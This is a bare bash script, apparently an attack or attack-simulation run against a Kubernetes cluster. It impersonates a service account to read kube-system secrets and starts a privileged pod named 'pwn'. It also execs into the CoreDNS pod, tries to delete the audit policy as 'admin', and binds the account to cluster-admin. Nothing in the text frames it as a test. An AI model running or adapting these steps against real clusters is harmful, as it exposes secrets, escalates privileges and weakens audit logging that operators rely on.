#!/bin/bash
set -euo pipefail

kubectl create ns secure-ops --dry-run=client -o yaml | kubectl apply -f -
kubectl config set-context --current --namespace=secure-ops

kubectl create sa monitoring --dry-run=client -o yaml | kubectl apply -f -
kubectl run attacker-pod --image=alpine --command -- sleep 3600
kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring || true

KUBE_SYSTEM_SECRET="$(
  kubectl get secrets -n kube-system -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true
)"

if [[ -n "${KUBE_SYSTEM_SECRET}" ]]; then
  kubectl get secret -n kube-system "${KUBE_SYSTEM_SECRET}" \
    --as=system:serviceaccount:secure-ops:monitoring || true
else
  kubectl get secrets -n kube-system \
    --as=system:serviceaccount:secure-ops:monitoring || true
fi

cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
  restartPolicy: Never
EOF

COREDNS_POD="$(
  kubectl get pods -n kube-system -l k8s-app=kube-dns -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true
)"

if [[ -n "${COREDNS_POD}" ]]; then
  kubectl exec -n kube-system "${COREDNS_POD}" -- cat /etc/resolv.conf || true
fi

kubectl delete -f /etc/kubernetes/audit-policy.yaml --as=admin || true

cat <<'EOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate-binding
subjects:
- kind: ServiceAccount
  name: monitoring
  namespace: secure-ops
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
